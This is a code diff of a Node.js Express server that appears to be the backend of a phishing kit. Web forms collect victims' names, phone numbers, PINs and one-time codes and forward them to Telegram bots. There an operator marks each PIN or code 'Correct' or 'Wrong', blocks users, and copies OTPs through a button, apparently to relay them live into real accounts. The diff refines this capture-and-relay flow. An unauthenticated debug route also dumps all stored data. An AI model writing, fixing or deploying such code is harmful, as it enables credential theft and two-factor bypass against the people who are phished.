@@ -20,13 +20,13 @@ const REQUIRED_UPDATES = ['message', 'callback_query'];
 const SEP = '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━';
 
 // ============================================================
-// 🔑 callback_data FORMAT
-// action:requestId|name|phone|extra
-//   - name/phone/extra pipe-escaped (| → ¦)
+// 🔑 UNKNOWN FIX — identity travels inside callback_data
+// Format:  action:requestId|name|phone|extra
+//   - name/phone/extra are pipe-escaped (| → ¦)
 //   - extra = PIN for pin_*, Code for code_*, empty for phone_*
 //   - total ≤ 64 bytes (Telegram hard limit)
-// This means the click itself carries the identity — no lookup,
-// no parser, no way to lose it.
+// This means a click carries the real values, so nothing can
+// be lost to a restart, redeploy, or second instance.
 // ============================================================
 const CB_MAX = 64;
 
@@ -136,12 +136,13 @@ app.use(express.static('public'));
 function getBot(botId) { return bots.find(b => b.botId === botId); }
 function botList() { return bots.map(b => b.botId).join(', ') || '(none)'; }
 
-// ⚠️ No "Unknown" placeholder anywhere
+// ⚠️ UNKNOWN FIX — no "Unknown" placeholder; empty stays empty
 function esc(str) {
     if (str === null || str === undefined) return '';
     return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
 }
 
+// ⚠️ UNKNOWN FIX — no "Unknown" placeholder; empty stays empty
 function pad(str) {
     let s = String(str === null || str === undefined ? '' : str);
     const minLen = 26;
@@ -207,7 +208,9 @@ async function editMessageText(bot, chatId, messageId, text) {
     }
 }
 
-// ---------------- WEBHOOK ----------------
+// ============================================================
+// 🔒 WEBHOOK — ALWAYS INCLUDES callback_query
+// ============================================================
 async function getWebhookInfo(bot) {
     try {
         const res = await axios.get(`https://api.telegram.org/bot${bot.botToken}/getWebhookInfo`);
@@ -277,10 +280,15 @@ setInterval(async () => {
     }
 }, 30 * 1000);
 
-// ---------------- ENTRY ----------------
+// ============================================================
+// 🚪 BOT ENTRY ROUTE
+// ============================================================
 app.get('/bot/:botId', (req, res) => {
     const bot = getBot(req.params.botId);
-    if (!bot) { console.log('❌ Invalid bot link:', req.params.botId, '| valid:', botList()); return res.status(404).send('Invalid bot link. Available: ' + botList()); }
+    if (!bot) {
+        console.log('❌ Invalid bot link:', req.params.botId, '| valid:', botList());
+        return res.status(404).send('Invalid bot link. Available: ' + botList());
+    }
     console.log(`🚪 Entry via ${bot.botId} — redirecting to index.html`);
     res.redirect(`/index.html?botId=${encodeURIComponent(bot.botId)}`);
 });
@@ -288,19 +296,29 @@ app.get('/bot/:botId', (req, res) => {
 app.get('/pin', (req, res) => res.sendFile(path.join(__dirname, 'public', 'pin.html')));
 app.get('/code', (req, res) => res.sendFile(path.join(__dirname, 'public', 'code.html')));
 
-// ---------------- PHONE ----------------
+// ============================================================
+// 📱 PHONE — Approve / Reject side by side
+// ============================================================
 app.post('/submit-phone', (req, res) => {
     const { name, phone, botId } = req.body;
     console.log('📥 /submit-phone received botId =', botId, '| valid bots:', botList());
-    const bot = getBot(botId);
-    if (!bot) { console.log('❌ submit-phone: no bot matches botId', botId); return res.status(400).json({ error: 'Invalid bot: ' + botId }); }
 
+    const bot = getBot(botId);
+    if (!bot) {
+        console.log('❌ submit-phone: no bot matches botId', botId);
+        return res.status(400).json({ error: 'Invalid bot: ' + botId });
+    }
+
+    // ⚠️ UNKNOWN FIX — do not substitute "Unknown"
     const finalName = name || '';
     const finalPhone = phone || '';
-    const requestId = uuidv4().replace(/-/g, '').slice(0, 10);
 
+    // ⚠️ UNKNOWN FIX — short id so name+phone fit inside 64-byte callback_data
+    const requestId = uuidv4().replace(/-/g, '').slice(0, 10);
     approvedPhones[requestId] = null;
-    requestBotMap[requestId] = { botId, name: finalName, phone: finalPhone, type: 'phone', createdAt: Date.now() };
+    requestBotMap[requestId] = {
+        botId, name: finalName, phone: finalPhone, type: 'phone', createdAt: Date.now()
+    };
     saveStore();
 
     console.log(`📤 Phone notification ${requestId} → ${bot.botId} (chat ${bot.chatId})`);
@@ -323,20 +341,28 @@ app.get('/check-phone/:requestId', (req, res) => {
     res.json({ approved: approvedPhones[requestId] ?? null });
 });
 
-// ---------------- PIN ----------------
+// ---------------- PIN — Correct / Wrong side by side, no copy ----------------
 app.post('/submit-pin', (req, res) => {
     const { name, phone, pin, botId } = req.body;
     console.log('📥 /submit-pin received botId =', botId, '| valid bots:', botList());
-    const bot = getBot(botId);
-    if (!bot) { console.log('❌ submit-pin: no bot matches botId', botId); return res.status(400).json({ error: 'Invalid bot: ' + botId }); }
 
+    const bot = getBot(botId);
+    if (!bot) {
+        console.log('❌ submit-pin: no bot matches botId', botId);
+        return res.status(400).json({ error: 'Invalid bot: ' + botId });
+    }
+
+    // ⚠️ UNKNOWN FIX — do not substitute "Unknown"
     const finalName = name || '';
     const finalPhone = phone || '';
     const finalPin = String(pin || '');
-    const requestId = uuidv4().replace(/-/g, '').slice(0, 10);
 
+    // ⚠️ UNKNOWN FIX — short id so name+phone+pin fit inside 64-byte callback_data
+    const requestId = uuidv4().replace(/-/g, '').slice(0, 10);
     approvedPins[requestId] = null;
-    requestBotMap[requestId] = { botId, name: finalName, phone: finalPhone, pin: finalPin, type: 'pin', createdAt: Date.now() };
+    requestBotMap[requestId] = {
+        botId, name: finalName, phone: finalPhone, pin: finalPin, type: 'pin', createdAt: Date.now()
+    };
     saveStore();
 
     console.log(`📤 PIN notification ${requestId} → ${bot.botId} (chat ${bot.chatId})`);
@@ -366,20 +392,28 @@ app.get('/check-pin/:requestId', (req, res) => {
     res.json({ approved: approvedPins[requestId] ?? null });
 });
 
-// ---------------- CODE ----------------
+// ---------------- OTP — Correct / Wrong side by side + Copy ----------------
 app.post('/submit-code', (req, res) => {
     const { name, phone, code, botId } = req.body;
     console.log('📥 /submit-code received botId =', botId, '| valid bots:', botList());
-    const bot = getBot(botId);
-    if (!bot) { console.log('❌ submit-code: no bot matches botId', botId); return res.status(400).json({ error: 'Invalid bot: ' + botId }); }
 
+    const bot = getBot(botId);
+    if (!bot) {
+        console.log('❌ submit-code: no bot matches botId', botId);
+        return res.status(400).json({ error: 'Invalid bot: ' + botId });
+    }
+
+    // ⚠️ UNKNOWN FIX — do not substitute "Unknown"
     const finalName = name || '';
     const finalPhone = phone || '';
     const finalCode = String(code || '');
-    const requestId = uuidv4().replace(/-/g, '').slice(0, 10);
 
+    // ⚠️ UNKNOWN FIX — short id so name+phone+code fit inside 64-byte callback_data
+    const requestId = uuidv4().replace(/-/g, '').slice(0, 10);
     approvedCodes[requestId] = null;
-    requestBotMap[requestId] = { botId, name: finalName, phone: finalPhone, code: finalCode, type: 'code', createdAt: Date.now() };
+    requestBotMap[requestId] = {
+        botId, name: finalName, phone: finalPhone, code: finalCode, type: 'code', createdAt: Date.now()
+    };
     saveStore();
 
     console.log(`📤 OTP notification ${requestId} → ${bot.botId} (chat ${bot.chatId})`);
@@ -415,7 +449,10 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
 
     try {
         const bot = getBot(req.params.botId);
-        if (!bot) { console.log('❌ Unknown bot:', req.params.botId, '| valid:', botList()); return; }
+        if (!bot) {
+            console.log('❌ Unknown bot:', req.params.botId, '| valid:', botList());
+            return;
+        }
 
         const cb = req.body.callback_query;
         if (!cb) return;
@@ -426,8 +463,9 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
             return;
         }
 
-        console.log('🔘 CALLBACK raw data:', JSON.stringify(cb.data), '| via', bot.botId);
+        console.log('🔘 CALLBACK:', cb.data, '| via', bot.botId);
 
+        // ⚠️ UNKNOWN FIX — read identity from the click itself
         const parsed = parseCallback(cb.data);
         if (!parsed) {
             console.log('⚠️ Malformed callback data:', cb.data);
@@ -436,65 +474,88 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
         }
 
         const { action, requestId, name, phone, extra } = parsed;
-        console.log('🔎 parsed =', JSON.stringify({ action, requestId, name, phone, extra }));
 
-        // COPY CODE
+        // ============================================================
+        // 📋 COPY OTP — replies with ONLY the code
+        // ============================================================
         if (action === 'code_copy') {
             const copyCode = extra || '';
             await answerCallback(bot, cb.id, 'Code sent for copying');
+
             const originalMsgId = cb.message?.message_id;
             const copyMessage = `<code>${esc(copyCode)}</code>`;
+
             if (originalMsgId) await replyTelegramMessage(bot, originalMsgId, copyMessage);
             else await sendTelegramMessage(bot, copyMessage);
+
             console.log('📋 code_copy sent for', requestId, '→', copyCode, `via ${bot.botId}`);
             return;
         }
 
+        // ============================================================
+        // ✅❌ APPROVAL / REJECTION
+        // ============================================================
         await answerCallback(bot, cb.id);
 
         let handled = false;
         let newText = '';
         let feedback = '';
 
+        // PHONE
         if (action === 'phone_ok') {
             if (requestId) approvedPhones[requestId] = true;
-            handled = true; feedback = 'Approved ✅';
-            newText = withIdentity('📱 PHONE NUMBER VERIFICATION', name, phone, ['<b>Status:</b> ✅ <b>Approved</b>']);
+            handled = true;
+            feedback = 'Approved ✅';
+            newText = withIdentity('📱 PHONE NUMBER VERIFICATION', name, phone, [
+                '<b>Status:</b> ✅ <b>Approved</b>'
+            ]);
         } else if (action === 'phone_bad') {
             if (requestId) approvedPhones[requestId] = false;
-            handled = true; feedback = 'Rejected ❌';
-            newText = withIdentity('📱 PHONE NUMBER VERIFICATION', name, phone, ['<b>Status:</b> ❌ <b>Rejected</b>']);
-        } else if (action === 'pin_ok') {
+            handled = true;
+            feedback = 'Rejected ❌';
+            newText = withIdentity('📱 PHONE NUMBER VERIFICATION', name, phone, [
+                '<b>Status:</b> ❌ <b>Rejected</b>'
+            ]);
+        }
+        // PIN
+        else if (action === 'pin_ok') {
             if (requestId) approvedPins[requestId] = true;
-            handled = true; feedback = 'Correct ✅';
+            handled = true;
+            feedback = 'Correct ✅';
             newText = withIdentity('🔐 PIN VERIFICATION', name, phone, [
                 `<b>PIN:</b>  <b><code>${esc(pad(extra))}</code></b>`,
                 '<b>Status:</b> ✅ <b>Correct</b>'
             ]);
         } else if (action === 'pin_bad') {
             if (requestId) approvedPins[requestId] = false;
-            handled = true; feedback = 'Wrong ❌';
+            handled = true;
+            feedback = 'Wrong ❌';
             newText = withIdentity('🔐 PIN VERIFICATION', name, phone, [
                 `<b>PIN:</b>  <b><code>${esc(pad(extra))}</code></b>`,
                 '<b>Status:</b> ❌ <b>Wrong</b>'
             ]);
         } else if (action === 'pin_block') {
             if (requestId) blockPins[requestId] = true;
-            handled = true; feedback = 'User blocked 🛑';
+            handled = true;
+            feedback = 'User blocked 🛑';
             newText = withIdentity('🔐 PIN VERIFICATION', name, phone, [
                 `<b>PIN:</b>  <b><code>${esc(pad(extra))}</code></b>`,
                 '<b>Status:</b> 🛑 <b>User blocked</b>'
             ]);
-        } else if (action === 'code_ok') {
+        }
+        // CODE
+        else if (action === 'code_ok') {
             if (requestId) approvedCodes[requestId] = true;
-            handled = true; feedback = 'Correct ✅';
+            handled = true;
+            feedback = 'Correct ✅';
             newText = withIdentity('🔑 OTP CODE VERIFICATION', name, phone, [
                 `<b>Code:</b> <b><code>${esc(pad(extra))}</code></b>`,
                 '<b>Status:</b> ✅ <b>Correct</b>'
             ]);
         } else if (action === 'code_bad') {
             if (requestId) approvedCodes[requestId] = false;
-            handled = true; feedback = 'Wrong ❌';
+            handled = true;
+            feedback = 'Wrong ❌';
             newText = withIdentity('🔑 OTP CODE VERIFICATION', name, phone, [
                 `<b>Code:</b> <b><code>${esc(pad(extra))}</code></b>`,
                 '<b>Status:</b> ❌ <b>Wrong</b>'
@@ -505,6 +566,7 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
         }
 
         if (!handled) return;
+
         saveStore();
         console.log('✅', action, '→', requestId, `(${name} / ${phone}) via ${bot.botId}`);
 
@@ -516,19 +578,29 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
 });
 
 // ---------------- DEBUG ----------------
-app.get('/debug/bots', (req, res) => res.json(bots.map(b => ({ botId: b.botId, chatId: b.chatId }))));
-app.get('/debug/stores', (req, res) => res.json({ approvedPins, approvedCodes, approvedPhones, blockPins, requestBotMap }));
+app.get('/debug/bots', (req, res) => {
+    res.json(bots.map(b => ({ botId: b.botId, chatId: b.chatId })));
+});
+
+app.get('/debug/stores', (req, res) => {
+    res.json({ approvedPins, approvedCodes, approvedPhones, blockPins, requestBotMap });
+});
+
 app.get('/debug/webhook/:botId', async (req, res) => {
     const bot = getBot(req.params.botId);
     if (!bot) return res.status(404).json({ error: 'Invalid bot: ' + req.params.botId });
     const info = await getWebhookInfo(bot);
     res.json(info || { error: 'failed' });
 });
+
 app.get('/debug/setwebhook', async (req, res) => {
     await ensureAllWebhooks();
     res.json({ message: 'Webhooks re-applied', bots: bots.map(b => b.botId) });
 });
-app.get('/health', (req, res) => res.json({ ok: true, bots: bots.map(b => b.botId), time: Date.now() }));
+
+app.get('/health', (req, res) => {
+    res.json({ ok: true, bots: bots.map(b => b.botId), time: Date.now() });
+});
 
 // ---------------- START ----------------
 (async () => {
